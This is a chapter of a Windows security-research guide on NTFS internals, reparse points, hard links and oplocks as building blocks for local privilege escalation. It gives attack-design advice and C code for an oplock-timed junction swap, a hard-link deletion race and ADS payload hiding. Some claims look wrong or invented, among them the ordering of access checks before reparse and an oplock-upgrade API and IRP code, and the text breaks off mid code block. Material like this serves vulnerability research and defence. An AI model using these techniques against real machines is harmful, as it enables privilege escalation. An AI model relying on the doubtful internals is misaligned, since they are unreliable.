# Chapter 06 — Windows Filesystem Security: NTFS Internals, Reparse Points, Oplocks, and LPE Chains

> **Scope:** This chapter covers the Windows filesystem from a security research perspective.
> Topics include NTFS on-disk architecture, file operation security semantics, reparse points
> and link types at the kernel level, hard link security implications, opportunistic lock
> mechanics and exploitation, the BaitAndSwitch TOCTOU pattern, the canonical arbitrary-file-write
> to LPE chain, NTFS transactions (TxF), minifilter driver architecture as an EDR bypass
> surface, recent filesystem CVEs (2024-2025), and Windows 11 24H2 filesystem hardening.

---

## 1. The I/O Request Pipeline: A Security Perspective

Understanding where security checks happen in the I/O stack is prerequisite for understanding
why certain vulnerability patterns exist.

### 1.1 From CreateFile to Disk

```
User-mode:
  CreateFile("C:\path\file.txt", GENERIC_READ, FILE_SHARE_READ, NULL,
             OPEN_EXISTING, FILE_FLAG_OVERLAPPED, NULL)
    ↓
Kernel transition:
  NtCreateFile(
    ObjectAttributes.ObjectName = "\??\C:\path\file.txt",
    DesiredAccess               = GENERIC_READ,
    ShareAccess                 = FILE_SHARE_READ,
    CreateDisposition           = FILE_OPEN,
    CreateOptions               = ...)
    ↓
I/O Manager:
  [1] Parse ObjectAttributes.ObjectName via ObpLookupObjectName
      → \??\C: resolved via process Device Map → \Device\HarddiskVolume3
      → Remaining path "\path\file.txt" passed to NTFS parse routine
  [2] Create IRP_MJ_CREATE packet
  [3] Send IRP down the filter manager stack
    ↓
Filter Manager (FltMgr.sys):
  [4] Pre-operation callbacks — each registered minifilter at its altitude
      (AV: altitude 320000; EDR: altitude 120000; etc.)
    ↓
NTFS.sys:
  [5] SeAccessCheck() against file's SECURITY_DESCRIPTOR
      (Check: does caller's token satisfy the file's DACL for GENERIC_READ?)
  [6] Check sharing mode against existing FILE_OBJECT opens on the same FCB
  [7] Look up file in MFT via $I30 B-tree
  [8] Process REPARSE_POINT attribute if present:
      → Re-issue IRP with substituted path (back to step 1)
      → Max 63 reparse iterations (STATUS_REPARSE_POINT_LOOP)
  [9] Open FCB (File Control Block), create CCB, return FILE_OBJECT
    ↓
Filter Manager:
  [10] Post-operation callbacks
    ↓
I/O Manager:
  [11] Complete IRP → return HANDLE to caller
```

**Critical security timing:** Step [5] (access check) happens AGAINST THE JUNCTION DIRECTORY
ITSELF, before step [8] (reparse point traversal). This means when a privileged process opens
`C:\AttackerDir\secret.dll` and `C:\AttackerDir` is a junction to `C:\Windows\System32\`,
the access check at step [5] is performed on `C:\AttackerDir` (the junction directory) —
NOT on `C:\Windows\System32\`. If the junction directory has permissive permissions
(it's in a user-writable location), the check passes, and then the reparse happens.

This is the fundamental security weakness that oplock+junction exploits rely on.

---

## 2. NTFS Architecture for Security Researchers

### 2.1 Master File Table (MFT)

Every file and directory on an NTFS volume is represented by one or more **MFT records**
(also called FILE records). The MFT is itself a file (`$MFT`) at the beginning of the volume.

Structure of a single MFT record (1KB by default):

```
FILE Record Header:
  Magic:           "FILE"
  UpdateSequence:  (for cross-sector coherence)
  LogFileSeqNum:   (for crash recovery via $LogFile)
  Flags:           IN_USE | DIRECTORY
  NextAttributeId: counter for new attributes
  MFT record index: (this record's position in MFT)

Attribute Stream:
  ├── $STANDARD_INFORMATION (type 0x10)
  │     Creation, modification, access, MFT timestamps
  │     File attributes (hidden, system, readonly, compressed, encrypted)
  │     Owner ID, Security ID (index into $Secure stream)
  │
  ├── $FILE_NAME (type 0x30) — ONE PER HARD LINK
  │     Filename (Unicode), parent directory MFT reference
  │     Timestamps (note: $STANDARD_INFORMATION timestamps are the "real" ones,
  │     $FILE_NAME timestamps are harder to modify — forensic artifact)
  │     Flags: WIN32_ONLY | DOS_ONLY | WIN32_AND_DOS | POSIX
  │
  ├── $DATA (type 0x80) — file content
  │     Small files: resident (data inline in MFT record)
  │     Large files: non-resident (run list of cluster extents)
  │     Named streams: $DATA:<stream_name> (Alternate Data Streams)
  │
  ├── $REPARSE_POINT (type 0xC0) — present only if reparse point
  │     ReparseTag: IO_REPARSE_TAG_SYMLINK or IO_REPARSE_TAG_MOUNT_POINT
  │     ReparseData: target path (for symlinks/junctions)
  │
  ├── $INDEX_ROOT (type 0x90) — directories only
  │     B-tree root for $I30 (directory listing index)
  │
  ├── $INDEX_ALLOCATION (type 0xA0) — directories only
  │     B-tree internal/leaf nodes (on disk)
  │
  └── $SECURITY_DESCRIPTOR (type 0x50) — file's SD
        (usually not stored inline; referenced from $Secure system file)
```

**Security descriptor storage:** NTFS does not store a unique SD per file. Instead, it uses
a volume-wide SD cache file (`$Secure`). Each file's `$STANDARD_INFORMATION` contains a
security ID (SID — not to be confused with the SID in tokens) that is an index into `$Secure`.
This means thousands of files can share the same SD by referencing the same entry.

**Forensic implication:** Timestomping — modifying `$STANDARD_INFORMATION` timestamps — is
easy (API: `SetFileTime`). Modifying `$FILE_NAME` timestamps is harder (requires direct
journal manipulation or raw disk write). Incident responders compare both; discrepancies
indicate tampering.

### 2.2 Alternate Data Streams (ADS)

A file can have multiple `$DATA` attributes. The default (unnamed) stream is the file's main
content. Additional named streams are **Alternate Data Streams**:

```
C:\path\file.txt          ← default $DATA stream
C:\path\file.txt:hidden   ← named ADS "hidden"
C:\path\file.txt:Zone.Identifier  ← Windows Mark-of-the-Web
```

ADS data:
- Is hidden from standard `dir` and Explorer listings
- Appears in `dir /R` and can be accessed via `Get-Item -Stream *`
- Counts toward disk quota
- Is preserved on copy within the same NTFS volume
- Is STRIPPED when copying to non-NTFS (FAT, network share, etc.)

**Security research use cases:**
- Malware hides payloads in ADS (evades simple file hash scanning)
- ADS can contain executable code (runnable via `wscript C:\file.txt:payload.js`)
- `Zone.Identifier:$DATA` contains the `[ZoneTransfer]` mark; removing it kills SmartScreen
- EDR filters that enumerate files by name may miss ADS — test by checking stream names

**Tools:**
```powershell
# Enumerate all streams on a file
Get-Item C:\path\file.txt -Stream *

# Read a specific ADS
Get-Content C:\path\file.txt -Stream hidden

# Find files with non-standard ADS in a directory
Get-ChildItem C:\path -Recurse |
  Get-Item -Stream * |
  Where-Object { $_.Stream -notmatch '^\$DATA$|^Zone.Identifier$' }
```

### 2.3 $OBJECT_ID Attribute

NTFS supports an `$OBJECT_ID` attribute (type 0x40) that assigns a volume-unique GUID to a
file. This GUID persists across renames and moves within the same volume. Windows uses it for
shell shortcuts (`.lnk` files store the GUID to track moved targets), DFS reparse points,
and some distributed file system features.

**Security note:** `$OBJECT_ID` can be used by security tools to track file identity across
renames — an anti-evasion mechanism. Malware that renames itself to evade path-based detections
can still be tracked via its GUID.

### 2.4 NTFS Permissions (ACL Evaluation)

NTFS files have a DACL stored in `$SECURE`. The access check sequence:

```
SeAccessCheck(SecurityDescriptor, SubjectSecurityContext, DesiredAccess, ...)

Algorithm:
1. Check if caller is Owner → grant READ_CONTROL + WRITE_DAC (even if DACL denies)
2. Process DACL ACEs in order:
   a. ACCESS_DENIED_ACE → if intersects DesiredAccess → DENY immediately
   b. ACCESS_ALLOWED_ACE → accumulate granted bits
3. If accumulated bits satisfy DesiredAccess → ALLOW
4. Otherwise → DENY

KEY RULE: Explicit DENY ACEs processed before ALLOW, but ONLY if they appear
          before the ALLOW ACE in the DACL. ACE ordering matters.
          Windows APIs that set security on files (SetFileSecurity) reorder ACEs
          into canonical order: Explicit Deny → Explicit Allow → Inherited Deny → Inherited Allow
```

**Inheritance:** Directory ACEs propagate to children according to inheritance flags:
- `OBJECT_INHERIT_ACE (OI)`: propagate to files in the directory
- `CONTAINER_INHERIT_ACE (CI)`: propagate to subdirectories
- `INHERIT_ONLY_ACE (IO)`: do not apply to the container itself; only to descendants
- `NO_PROPAGATE_INHERIT_ACE (NP)`: apply to direct children but do not propagate further

**Common misconfiguration:** A directory has a permissive inherited ACE (`CI+OI`) that
propagates world-write to all subdirectories and files, even when specific files should
be protected. Always check inherited ACEs separately from explicit ACEs:

```powershell
# Check for world-writable files/dirs (icacls approach)
icacls C:\ProgramData\Vendor /findsid *S-1-1-0 /t  # Everyone SID
# Or:
Get-Acl C:\ProgramData\Vendor\* | Where-Object {
  $_.Access | Where-Object { $_.IdentityReference -match "Everyone" -and
                              $_.FileSystemRights -match "Write" }
}
```

---

## 3. Reparse Points: Architecture and Attack Use

### 3.1 Reparse Point Structure

A reparse point is an NTFS `$REPARSE_POINT` attribute on a file or directory. The kernel's
I/O manager checks for the `FILE_ATTRIBUTE_REPARSE_POINT` flag during path resolution and,
if present, reads the reparse buffer and re-issues the IRP with the substituted path.

Binary format of the reparse data buffer:

```c
typedef struct _REPARSE_DATA_BUFFER {
    ULONG  ReparseTag;          // Identifies the type (IO_REPARSE_TAG_SYMLINK, etc.)
    USHORT ReparseDataLength;   // Length of the ReparseData field
    USHORT Reserved;
    union {
        struct {                // For IO_REPARSE_TAG_SYMLINK
            USHORT SubstituteNameOffset;  // Offset in PathBuffer for NT path
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;       // Offset for user-visible path (Explorer)
            USHORT PrintNameLength;
            ULONG  Flags;                 // SYMLINK_FLAG_RELATIVE (0x1) or absolute (0x0)
            WCHAR  PathBuffer[1];         // Substitute + Print names concatenated
        } SymbolicLinkReparseBuffer;
        struct {                // For IO_REPARSE_TAG_MOUNT_POINT (junction)
            USHORT SubstituteNameOffset;
            USHORT SubstituteNameLength;
            USHORT PrintNameOffset;
            USHORT PrintNameLength;
            WCHAR  PathBuffer[1];
        } MountPointReparseBuffer;
        struct {                // For third-party tags (tagged with vendor GUID)
            GUID   ReparseGuid;
            UCHAR  DataBuffer[1];
        } GenericReparseBuffer;
    };
} REPARSE_DATA_BUFFER;
```

### 3.2 Reparse Tag Registry

| Tag Value | Constant | Description | Attack Relevance |
|---|---|---|---|
| `0xA000000C` | `IO_REPARSE_TAG_SYMLINK` | NTFS symbolic link | Requires privilege; cross-volume capable |
| `0xA0000003` | `IO_REPARSE_TAG_MOUNT_POINT` | Junction / mount point | No privilege required; directory-level redirect |
| `0x80000017` | `IO_REPARSE_TAG_CLOUD` | OneDrive stub | Traversal behavior depends on cloud provider filter |
| `0x8000001A` | `IO_REPARSE_TAG_APPEXECLINK` | App execution alias | UWP app alias — abuse for path traversal (see 3.5) |
| `0x80000023` | `IO_REPARSE_TAG_LX_SYMLINK` | WSL symlink | WSL filesystem boundary; cross-FS attack surface |
| `0x80000025` | `IO_REPARSE_TAG_LX_FIFO` | WSL FIFO | WSL special file |
| `0x80000026` | `IO_REPARSE_TAG_LX_CHR` | WSL char device | WSL special file |
| `0x80000027` | `IO_REPARSE_TAG_LX_BLK` | WSL block device | WSL special file |
| `0x8000001E` | `IO_REPARSE_TAG_WCI` | WCI container layer | Windows Container isolation — escape research 2024 |
| `0x80000030` | `IO_REPARSE_TAG_AF_UNIX` | AF_UNIX socket (WSL2) | New in Win11; cross-namespace boundary |

**Third-party cloud storage tags:** Cloud provider reparse points (`IO_REPARSE_TAG_CLOUD_*`)
are processed by vendor minifilter drivers, not by NTFS directly. These drivers implement
their own traversal logic that may have weaker security validation than the kernel's native
reparse handling. Investigating third-party reparse traversal is an underexplored area.

### 3.3 NTFS Junction vs. NTFS Symlink vs. Object Manager Symlink vs. Hard Link

| Feature | NTFS Junction | NTFS File Symlink | Object Manager Symlink | Hard Link |
|---|---|---|---|---|
| **Target scope** | Directory only | File or directory | Any named object | File only |
| **Cross-volume** | No — same volume | Yes | Yes | No — same volume |
| **Privilege required** | None (own directory) | `SeCreateSymbolicLinkPrivilege` or Developer Mode | None (if target dir allows) | Write access to directory |
| **NTFS layer** | Yes — $REPARSE_POINT attr | Yes — $REPARSE_POINT attr | No — Object Manager only | Yes — $FILE_NAME attr |
| **OBJ_DONT_REPARSE blocks** | Yes | Yes | No (pre-NTFS) | N/A |
| **Win32 path visible** | Yes | Yes | Yes via `\\?\` path | Yes |
| **Absolute or relative** | Absolute NT path only | Both | Both | N/A |

**Attack design guidance:**

- **Use junctions** when you need directory-level redirection and have no special privileges.
  Junctions point to NT paths (`\Device\HarddiskVolume3\path`) and require the target to be
  a directory on the same volume.

- **Use Object Manager symlinks** in `\??` when you need to redirect a drive-letter path
  at the object manager layer, before NTFS sees it. These symlinks bypass `OBJ_DONT_REPARSE`
  because that flag only affects NTFS reparse traversal. Create via `DefineDosDevice` or
  `NtCreateSymbolicLinkObject`.

- **Use NTFS file symlinks** when cross-volume file-level redirection is needed, but this
  requires Developer Mode or privilege — significantly limiting unprivileged exploitability.

- **Use hard links** for "file identity redirect" primitives: creating a hard link to a
  privileged file, then exploiting a privileged operation that deletes-then-creates at the
  same name. The hard link ensures the file's MFT record remains accessible through the
  attacker's path after deletion.

### 3.4 Creating Reparse Points

```c
// Creating a junction (mount point) — unprivileged
// 1. Create directory
// 2. Open with FILE_FLAG_BACKUP_SEMANTICS + FILE_FLAG_OPEN_REPARSE_POINT
// 3. Set reparse point via FSCTL_SET_REPARSE_POINT

// Using Win32 CreateDirectory + DeviceIoControl:
HANDLE hDir = CreateFile(junctionPath,
    GENERIC_READ | GENERIC_WRITE,
    0, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);

// Populate REPARSE_DATA_BUFFER with IO_REPARSE_TAG_MOUNT_POINT
// SubstituteName = "\??\" + targetPath  (NT path format)
DeviceIoControl(hDir, FSCTL_SET_REPARSE_POINT,
    &reparseBuffer, reparseBufferSize, NULL, 0, &bytesReturned, NULL);

// Deleting a reparse point:
DeviceIoControl(hDir, FSCTL_DELETE_REPARSE_POINT, ...);
```

**Practical note:** `symboliclink-testing-tools` (Project Zero) provides `CreateMountPoint.exe`
which automates junction creation with proper NT path formatting. The tool handles the
`\??\` prefix correctly and can create junctions to non-existent target paths (useful for
staging the attack before the target is set up).

### 3.5 AppExecLink Reparse Points — UWP Alias Abuse (2024)

`IO_REPARSE_TAG_APPEXECLINK` (`0x8000001A`) is used by UWP app execution aliases: stub
executables placed at `%LOCALAPPDATA%\Microsoft\WindowsApps\<appname>.exe` that redirect
launches to the actual packaged app via the Desktop App Broker. The reparse data contains
the Package Family Name, Application ID, and target path.

**Structure of AppExecLink reparse data:**
```c
// AppExecLink reparse buffer layout (undocumented)
// Offset 0x00: ULONG  Version (always 3)
// Offset 0x04: WCHAR  Payload[] — four null-separated Unicode strings:
//   [0] Package Family Name  e.g. "Microsoft.WindowsTerminal_8wekyb3d8bbwe"
//   [1] Application ID       e.g. "App"
//   [2] Target executable    e.g. "C:\Program Files\WindowsApps\...\wt.exe"
//   [3] Empty string
```

**Attack surface: path traversal via AppExecLink in world-writable directory**

The `%LOCALAPPDATA%\Microsoft\WindowsApps\` directory is user-writable. A user can create
a crafted AppExecLink reparse point there. If a privileged process (e.g., installer, update
service) enumerates files in this path and processes them based on the reparse data without
validating the package signature, the attacker-controlled target path in field [2] can
redirect execution.

```c
// Reading AppExecLink reparse buffer to extract target path
HANDLE hFile = CreateFile(aliasPath,
    GENERIC_READ,
    FILE_SHARE_READ | FILE_SHARE_WRITE,
    NULL, OPEN_EXISTING,
    FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_BACKUP_SEMANTICS, NULL);

BYTE buf[4096];
DWORD dwBytesReturned;
DeviceIoControl(hFile, FSCTL_GET_REPARSE_POINT, NULL, 0,
    buf, sizeof(buf), &dwBytesReturned, NULL);

REPARSE_DATA_BUFFER *rdb = (REPARSE_DATA_BUFFER *)buf;
// rdb->ReparseTag == IO_REPARSE_TAG_APPEXECLINK (0x8000001A)
// Walk the null-separated strings in GenericReparseBuffer.DataBuffer
// to extract target path
```

**Research checklist for AppExecLink abuse:**
1. Identify processes that read `WindowsApps\` path (ProcMon filter: `Path contains WindowsApps`)
2. Check whether the reading process validates Package Family Name against the AppX manifest
3. If target path from reparse data is used without validation → arbitrary execution primitive

### 3.6 WSL Reparse Points and Cross-FS Symlink Attacks (Windows 11)

Windows 11 introduced new reparse tags for WSL2 integration:

| Tag | Constant | Purpose |
|-----|----------|---------|
| `0x80000023` | `IO_REPARSE_TAG_LX_SYMLINK` | WSL symlink (target stored in reparse data) |
| `0x80000025` | `IO_REPARSE_TAG_LX_FIFO` | WSL named pipe |
| `0x80000026` | `IO_REPARSE_TAG_LX_CHR` | WSL character device |
| `0x80000027` | `IO_REPARSE_TAG_LX_BLK` | WSL block device |
| `0x80000030` | `IO_REPARSE_TAG_AF_UNIX` | AF_UNIX socket for WSL2↔Win32 IPC |

**Cross-FS symlink attack scenario:**

WSL symlinks (`IO_REPARSE_TAG_LX_SYMLINK`) are created by the WSL filesystem driver
(`lxcore.sys`). When accessed from the Windows NT path namespace, the kernel sees a
reparse point with an unrecognized tag (from the NT perspective). The behavior depends
on whether the accessing process opens with `FILE_FLAG_OPEN_REPARSE_POINT`:

```
Scenario: WSL symlink at C:\Users\user\AppData\Local\Packages\<WSL>\...\rootfs\tmp\link
  → Target: /etc/shadow (absolute WSL path)

Windows process opens without FILE_FLAG_OPEN_REPARSE_POINT:
  → lxcore.sys intercepts, resolves within WSL VFS namespace
  → Returns WSL file content to Windows process
  → Windows process may not expect to receive /etc/shadow content

Attack relevance:
  → A privileged Windows process that copies files from a WSL rootfs path
     without FILE_FLAG_OPEN_REPARSE_POINT can be redirected via WSL symlinks
     to read arbitrary files within the WSL namespace
```

**Auditing WSL reparse points on a live system:**
```powershell
# Find WSL-created reparse points under a path
Get-ChildItem -Path "C:\Users\$env:USERNAME\AppData\Local\Packages" -Recurse -Force |
    Where-Object { $_.Attributes -band [System.IO.FileAttributes]::ReparsePoint } |
    Select-Object FullName, Attributes
```

```windbg
; In kernel debugger — examine LX_SYMLINK reparse buffer
; dt lxcore!_LX_SYMLINK_REPARSE_BUFFER <address>
; The target path is stored as a UTF-8 byte array in the reparse data
```

### 3.7 WCI (Windows Container Isolation) Filter Reparse Points — Escape Research 2024

Windows Container Isolation (`wcifs.sys`) implements the container filesystem layer using
`IO_REPARSE_TAG_WCI` (`0x8000001E`) and related tags. WCI provides copy-on-write semantics
for container images: files in the base image appear in the container via reparse points;
writes go to a per-container scratch layer.

**WCI tag family:**
```
IO_REPARSE_TAG_WCI         0x8000001E  — main WCI reparse tag
IO_REPARSE_TAG_WCI_1       0x9000001E  — variant
IO_REPARSE_TAG_WCI_LINK    0xA000001E  — hard link variant
IO_REPARSE_TAG_WCI_TOMBSTONE 0xA000001F — deleted file marker
```

**Container escape research surface (2024):**

The WCI filter driver processes reparse points to serve base-image files to the container
namespace. Attack vectors being researched:

1. **Crafted WCI reparse buffer:** If a low-privilege process inside the container can write
   a crafted `IO_REPARSE_TAG_WCI` reparse point, and the host-side WCI filter driver follows
   it without proper privilege validation, the path resolution can escape the container
   scratch layer into the host filesystem.

2. **TOCTOU in WCI layer stack-up:** WCI layers can be stacked (multiple base image layers
   merged). A race condition between layer resolution and file content delivery could allow
   container code to read files from a different container's scratch layer.

3. **WCI + junction chaining:** A WCI reparse point that resolves to a directory containing
   an NTFS junction can create a two-hop traversal that escapes the container filesystem
   boundary.

```c
// Reading WCI reparse data from inside a container (research purposes)
// The WCI reparse buffer contains:
//   ULONG  Version
//   GUID   LayerIdentifier  (identifies which base image layer)
//   ULONG  Flags
//   WCHAR  FilePath[]       (path within the base image layer)

// Auditing: compare ReparseTag of container files against expected WCI tags
HANDLE hDir = CreateFile(containerPath,
    GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_OPEN_REPARSE_POINT | FILE_FLAG_BACKUP_SEMANTICS, NULL);
DeviceIoControl(hDir, FSCTL_GET_REPARSE_POINT, NULL, 0,
    buf, sizeof(buf), &dwBytes, NULL);
// Inspect ReparseTag — unexpected tags in container path may indicate escape
```

**References for WCI escape research:**
- `wcifs.sys` symbols available from Microsoft symbol server
- Check WCI filter altitude (around 180451) and its pre-create callback logic
- `!fltkd.filter` in WinDbg on a Hyper-V host with containers running

---

## 4. Hard Links: Security Implications

### 4.1 How Hard Links Work at the MFT Level

A hard link is a second (or third, etc.) `$FILE_NAME` attribute on the same MFT record.
From NTFS's perspective, there is ONE file (one MFT record, one data stream, one security
descriptor) and MULTIPLE directory entries pointing to it.

```
MFT Record #4721:
  $STANDARD_INFORMATION: Created=2024-01-01, Modified=2024-01-02
  $FILE_NAME[0]: "secret.txt" → parent dir = C:\Alice\Documents\ (MFT #1234)
  $FILE_NAME[1]: "public.txt" → parent dir = C:\Public\ (MFT #5678)
  $DATA: [file content — shared by both paths]
  $SECURITY_DESCRIPTOR: [SD — applied regardless of which path is used to open]
```

**Key implication:** The security descriptor controls access from **either path**. If the SD
grants Alice full control and denies Everyone else, then `C:\Public\public.txt` is also
protected — the directory `C:\Public\` may allow world-read, but the file's own DACL
prevents access.

However, the directory's DACL controls who can **create** entries (including hard links).
If `C:\Public\` is world-writable, any user can create a hard link there to any file they
have `FILE_WRITE_ATTRIBUTES` access to.

### 4.2 CreateHardLink Security Requirements

`CreateHardLink(newPath, existingPath, NULL)` requires:
1. The caller has `FILE_WRITE_ATTRIBUTES` on the existing file (to add the new $FILE_NAME)
2. The caller has write access to the directory where `newPath` will be created
3. Both paths must be on the same NTFS volume

**Token-level check:** `CreateHardLink` performs an access check on the existing file using
the caller's token. If the file has a DACL that denies the caller `FILE_WRITE_ATTRIBUTES`,
the hard link creation fails. This prevents unprivileged users from creating hard links to
SYSTEM-owned files they cannot write.

**Exception: backup operators.** Users with `SeBackupPrivilege` can open files with
`FILE_FLAG_BACKUP_SEMANTICS`, bypassing DACL checks. In some configurations, this allows
hard link creation to otherwise restricted files.

### 4.3 Hard Link LPE Pattern

The classic hard link LPE pattern operates through **file deletion races**:

```
PRECONDITION:
  - Privileged service (SYSTEM) performs this sequence:
    1. Validate file C:\Logs\output.txt doesn't exist (or delete it)
    2. Create C:\Logs\output.txt and write data
  - Attacker has write access to C:\Logs\

ATTACK:
  1. Wait for SYSTEM to delete C:\Logs\output.txt (or time before creation)
  2. Create hard link: CreateHardLink("C:\Logs\output.txt", "C:\AttackerTarget.txt")
     Where AttackerTarget.txt is a file the attacker wants written to
  3. SYSTEM's CreateFile("C:\Logs\output.txt") → opens the hard-linked file
  4. SYSTEM writes content → writes to C:\AttackerTarget.txt as SYSTEM
  5. AttackerTarget.txt is now attacker-controlled content at a privileged path
```

**Note:** Modern Windows applies additional protections. Privileged services typically use
`FILE_FLAG_OPEN_REPARSE_POINT` or `OBJ_DONT_REPARSE`, but hard links do NOT involve reparse
points — they are pure MFT-level aliases. Hard link attacks are therefore not blocked by
`OBJ_DONT_REPARSE`.

The delete-before-create TOCTOU window with hard links is commonly combined with oplocks
(see Section 6) for reliable timing.

---

## 5. Opportunistic Locks (Oplocks): Mechanics and Exploitation

> **Bug class:** ch08 §2 (Junction + Oplock TOCTOU). ch09 §1 (File System Primitives including oplock-based timing).

### 5.1 What is an Oplock?

An **opportunistic lock** is a mechanism that allows a process to request notification from
the kernel when another process attempts to access a specific file. The notification fires
*before* the second process's file operation completes — the second process is blocked,
waiting for the oplock holder to acknowledge the break.

Oplocks were designed for caching optimization (clients cache file data; if another client
opens the file, the cache must be invalidated before the second client sees stale data).
From a security perspective, they are a **synchronization primitive** that converts timing
races into attacker-controlled synchronization points.

### 5.2 Oplock Types

| Oplock Type | Request Code | Break Trigger | Exploit Suitability |
|---|---|---|---|
| **Level 1** (exclusive) | `FSCTL_REQUEST_OPLOCK_LEVEL_1` | Any other open | Poor — breaks too broadly |
| **Level 2** (shared read) | `FSCTL_REQUEST_OPLOCK_LEVEL_2` | Write or exclusive open | Poor — can't use for write operations |
| **Batch** | `FSCTL_REQUEST_BATCH_OPLOCK` | Any open by another process | Moderate |
| **Filter** | `FSCTL_REQUEST_FILTER_OPLOCK` | Open for read or write by another | Good |
| **Atomic (Win7+)** | `FSCTL_REQUEST_OPLOCK` | Configurable via flags | **Best** — full control |

**The atomic oplock (FSCTL_REQUEST_OPLOCK)** introduced in Windows 7 is the recommended
type for security research because:
1. The break condition is configurable: `OPLOCK_LEVEL_CACHE_READ | OPLOCK_LEVEL_CACHE_HANDLE`
   fires when another process opens the file with any conflicting access
2. The notification is asynchronous (overlapped I/O) — the oplock holder receives the break
   on a thread while the victim process is blocked in the kernel
3. The break notification includes information about the violating access (whether it's a
   read, write, or handle-only open)

### 5.3 Oplock API

```c
// Open the bait file — must use FILE_FLAG_OVERLAPPED and sharing that allows future opens
HANDLE hBait = CreateFile(
    "C:\\BaitDir\\target.dll",
    GENERIC_READ,
    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
    NULL, OPEN_EXISTING,
    FILE_FLAG_OVERLAPPED, NULL);

// Request atomic oplock — will complete (via OVERLAPPED) when oplock breaks
REQUEST_OPLOCK_INPUT_BUFFER inputBuffer = {
    .StructureVersion  = REQUEST_OPLOCK_CURRENT_VERSION,
    .StructureLength   = sizeof(REQUEST_OPLOCK_INPUT_BUFFER),
    .RequestedOplockLevel = OPLOCK_LEVEL_CACHE_READ |
                            OPLOCK_LEVEL_CACHE_HANDLE,
    .Flags = REQUEST_OPLOCK_INPUT_FLAG_REQUEST
};

REQUEST_OPLOCK_OUTPUT_BUFFER outputBuffer = {
    .StructureVersion = REQUEST_OPLOCK_CURRENT_VERSION,
    .StructureLength  = sizeof(REQUEST_OPLOCK_OUTPUT_BUFFER)
};

OVERLAPPED overlapped = { 0 };
overlapped.hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

DeviceIoControl(hBait,
    FSCTL_REQUEST_OPLOCK,
    &inputBuffer,  sizeof(inputBuffer),
    &outputBuffer, sizeof(outputBuffer),
    NULL,
    &overlapped);
// Returns immediately; oplock is now held

// Wait for oplock break (blocks until victim process touches the bait file):
WaitForSingleObject(overlapped.hEvent, INFINITE);
// ← At this point: victim process is BLOCKED in NtCreateFile

// [RACE WINDOW — do your swap here]
// 1. Remove C:\BaitDir\  (if attacker created it)
// 2. Create junction C:\BaitDir → C:\Windows\System32
// 3. Acknowledge the oplock break

// Acknowledge the break — victim process will continue after this
REQUEST_OPLOCK_INPUT_BUFFER ackBuffer = {
    .StructureVersion  = REQUEST_OPLOCK_CURRENT_VERSION,
    .StructureLength   = sizeof(REQUEST_OPLOCK_INPUT_BUFFER),
    .RequestedOplockLevel = OPLOCK_LEVEL_CACHE_NONE,
    .Flags = REQUEST_OPLOCK_INPUT_FLAG_ACK
};
DeviceIoControl(hBait, FSCTL_REQUEST_OPLOCK, &ackBuffer, sizeof(ackBuffer),
    NULL, 0, NULL, &overlapped2);
```

The `SetOpLock.exe` tool from `symboliclink-testing-tools` automates this entire flow:
```
SetOpLock.exe "C:\BaitDir\target.dll" rh
# Outputs: "Waiting for oplock break..."
# Then blocks until victim opens the file, then signals the attacker
```

### 5.4 Oplock Corner Cases

**Corner case 1: File opened with `FILE_SHARE_NONE`**
If the victim opens the bait file with exclusive access (`FILE_SHARE_NONE`), the oplock
break fires but the victim may receive `STATUS_SHARING_VIOLATION` if the oplock holder
still has the file open. The attacker must close the bait handle before acknowledging.

**Corner case 2: `FILE_FLAG_OPEN_REPARSE_POINT`**
If the victim uses `FILE_FLAG_OPEN_REPARSE_POINT` (Win32) or `OBJ_DONT_REPARSE` (NT),
the kernel opens the junction directory itself rather than following it. The BaitAndSwitch
attack fails because the junction is not traversed. Auditing for this flag's absence is
the first check in code review.

**Corner case 3: Process Monitor interference**
ProcMon's minifilter driver (`PROCMON24.SYS`) opens files to record access — this can
trigger oplock breaks prematurely during testing. Disable ProcMon or use kernel debugging
instead.

### 5.5 Oplock Filter Key Abuse — CVE-2024-21338 Indirect Usage

CVE-2024-21338 was a Windows kernel EoP exploited in the wild (attributed to Lazarus Group,
February 2024). While the primary bug was in `appid.sys` (AppLocker's kernel driver), the
exploitation mechanism involved a crafted IOCTL to manipulate kernel callback structures.
The oplock connection is indirect: the exploit used file I/O timing to trigger the vulnerable
code path at a precise moment.

**Oplock filter key** (`FilterKey` field in `FSCTL_REQUEST_OPLOCK`) is an opaque 64-bit value
the caller sets when requesting an oplock. It is echoed back in the break notification, allowing
multi-threaded oplock managers to correlate notifications with outstanding requests. In
server-side implementations (SMB, etc.), the filter key maps to a specific client connection.

**Abuse pattern:**
If a kernel component accepts a filter key from user mode without validation and uses it
to look up a structure (e.g., a linked list of per-connection contexts), a crafted filter
key value can be used for:
- Out-of-bounds read (treating the key as a pointer offset)
- Type confusion (if the key is cast to a pointer type)

Audit target: drivers that call `FsRtlCheckOplockEx2()` or `FsRtlOplockBreakToNone()` with
user-supplied filter key parameters.

```c
// Kernel-side filter key in oplock break notification
typedef struct _OPLOCK_NOTIFY_INFO {
    ULONG64 FilterKey;          // echoed from the requestor — validate this!
    // ... other fields
} OPLOCK_NOTIFY_INFO;
```

### 5.6 OplockUpgradedToLevel1 Race — New Variant (2024)

A Level 2 oplock (shared read, multiple holders allowed) can be upgraded to Level 1
(exclusive) when one holder requests exclusivity. The upgrade sequence:

```
State: File has Level 2 oplocks held by processes A and B
  Process A requests upgrade to Level 1:
    → Kernel sends break notification to ALL Level 2 holders
    → Each holder must acknowledge (release) before upgrade completes
    → Process A is blocked until all Level 2 holders ack

Race window during upgrade acknowledgment:
  Between B's ack (Level 2 released) and A's Level 1 grant:
  → File has NO oplock for a brief interval
  → A third process C can acquire a new Level 2 oplock
  → This resets the upgrade countdown
  → With repeated C openings, A can be indefinitely starved
```

**Security implication:** A service that holds a Level 1 oplock to protect a TOCTOU
window can be denied the upgrade if an attacker repeatedly opens the file with Level 2
compatible access, preventing the service from completing its protected operation.

**New kernel API surface:** `FsRtlRequestOplockUpgradeToLevel1()` was added in recent
Windows builds to handle upgrade-to-Level1 atomically with reduced race exposure. Minifilter
drivers that intercept oplock upgrades must handle the new `IRP_MN_OPLOCK_UPGRADE` minor
function code.

```c
// New API — available in WDK for Windows 11 24H2+
